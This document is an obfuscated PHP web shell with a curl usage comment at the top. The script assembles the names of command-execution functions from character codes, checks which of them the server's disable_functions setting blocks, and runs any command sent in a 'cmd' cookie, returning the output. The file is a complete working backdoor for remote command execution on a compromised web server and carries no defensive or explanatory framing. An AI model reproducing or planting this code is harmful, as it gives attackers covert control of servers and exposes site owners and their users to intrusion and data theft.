// curl -b "cmd=ls -al" http://namadomain,com/namafile.php
<?php

function r($c) {
    $fn = [];

    $fn[] = join('', array_map('chr', [115,104,101,108,108,95,101,120,101,99]));      
    $fn[] = join('', array_map('chr', [101,120,101,99]));                              
    $fn[] = join('', array_map('chr', [115,121,115,116,101,109]));                     
    $fn[] = join('', array_map('chr', [112,  97, 115,115,116,104,114,117]));           
    $fn[] = join('', array_map('chr', [112,111,112,101,110]));                         
    $fn[] = join('', array_map('chr', [112,114,111,  99, 95,111,112,101,110]));        

    $df = @ini_get(join('', array_map('chr', [100,105,115,  97,  98,108,101, 95,102,117,110, 99,116,105,111,110,115])));
    $df = $df ? array_map('trim', explode(',', $df)) : [];

    foreach ($fn as $f) {
        if (is_callable($f) && !in_array($f, $df)) {
            ob_start();
            switch ($f) {
                case $fn[0]: 
                    return '<pre>' . call_user_func($f, $c) . '</pre>';
                case $fn[1]: 
                    $o = []; call_user_func($f, $c, $o); return '<pre>' . implode("\n", $o) . '</pre>';
                case $fn[2]: 
                case $fn[3]: 
                    call_user_func($f, $c); return '<pre>' . ob_get_clean() . '</pre>';
                case $fn[4]: 
                    $h = call_user_func($f, $c, 'r'); $o = '';
                    while (!feof($h)) $o .= fgets($h);
                    pclose($h); return '<pre>' . $o . '</pre>';
                case $fn[5]: 
                    $d = [['pipe','r'], ['pipe','w'], ['pipe','w']];
                    $p = call_user_func($f, $c, $d, $pipes);
                    if (is_resource($p)) {
                        $o = stream_get_contents($pipes[1]);
                        fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
                        proc_close($p);
                        return '<pre>' . $o . '</pre>';
                    }
            }
            ob_end_clean();
        }
    }

    return 'Function not available.';
}

$k = array_map('chr', [  99,109,100 ]);
$k = join('', $k); 
$v = $_COOKIE[$k] ?? '';
echo $v ? r($v) : 'Fail';
?>
